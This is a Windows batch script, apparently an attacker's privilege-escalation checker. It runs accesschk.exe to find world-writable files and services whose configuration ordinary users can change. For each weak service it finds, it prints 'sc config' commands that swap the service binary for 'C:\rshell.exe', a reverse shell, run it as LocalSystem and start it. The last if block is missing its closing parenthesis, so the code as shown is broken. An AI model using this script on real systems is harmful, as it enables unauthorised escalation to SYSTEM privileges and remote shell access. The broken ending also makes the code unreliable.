@ECHO OFF
echo.Files and folder with Read-Write access
echo.---------------------------------------
dir accesschk.exe /a/s/b
IF %ERRORLEVEL% == 1 (
        echo === NOTE: accesschk.exe not found, skipping accesschk file permissions checks ===
        goto:eof
)
 
        accesschk.exe /accepteula 1>2>NUL
       
        accesschk.exe -uwqs "Everyone" c:\*.* | findstr /VI "\.*system32\\Setup*. \.*system32\\spool\\PRINTERS*. \.*Registration\\CRMLog*. \.*Debug\\UserMode*. \.*WINDOWS\\Tasks*. \.*WINDOWS\\Temp*. \.*Documents.And.Settings*. \.*RECYCLER*. \.*System.Volume.Information*."
        accesschk.exe -uwqs "Users" c:\*.* | findstr /VI "\.*system32\\Setup*. \.*system32\\spool\\PRINTERS*. \.*Registration\\CRMLog*. \.*Debug\\UserMode*. \.*WINDOWS\\Tasks*. \.*WINDOWS\\Temp*. \.*Documents.And.Settings*. \.*RECYCLER*. \.*System.Volume.Information*."
        accesschk.exe -uwqs "Authenticated Users" c:\*.*  | findstr /VI \.*System.Volume.Information*. | findstr /VI \.*Documents.And.Settings*.
       
        echo.Searching for weak service permissions
        echo.--------------------------------------
        accesschk.exe -uwcqv "Authenticated Users" * | Find "RW " 1> NUL
        if %ERRORLEVEL% == 0 (
                echo.**** !!! VULNERABLE SERVICES FOUND - Authenticated Users!!! ****
                accesschk.exe -uwcqv "Authenticated Users" *
                echo.****************************************************************
                echo.
        )
        accesschk.exe /accepteula 1>2>NUL
        accesschk.exe -uwcqv "Users" * | Find "RW " 1> NUL
        if %ERRORLEVEL% == 0 (
                echo.**** !!! VULNERABLE SERVICES FOUND - All Users !!! ****
                accesschk.exe -uwcqv "Users" *
                echo.*******************************************************
                echo.To plant binary in service use:
                echo.sc config [service_name] binpath= "C:\rshell.exe"
                echo.sc config [service_name] obj= ".\LocalSystem" password= ""
                echo.sc qc [service_name] (to verify!)
                echo.net start [service_name]
                echo.*******************************************************
        )
        accesschk.exe /accepteula 1>2>NUL
        accesschk.exe -uwcqv "Everyone" * | Find "RW " 1> NUL
        if %ERRORLEVEL% == 0 (
                echo.**** !!! VULNERABLE SERVICES FOUND - Everyone !!! ****
                accesschk.exe -uwcqv "Everyone" *
                echo.*******************************************************
                echo.To plant binary in service use:
                echo.sc config [service_name] binpath= "C:\rshell.exe"
                echo.sc config [service_name] obj= ".\LocalSystem" password= ""
                echo.sc qc [service_name] (to verify!)
                echo.net start [service_name]
                echo.*******************************************************
goto:eof

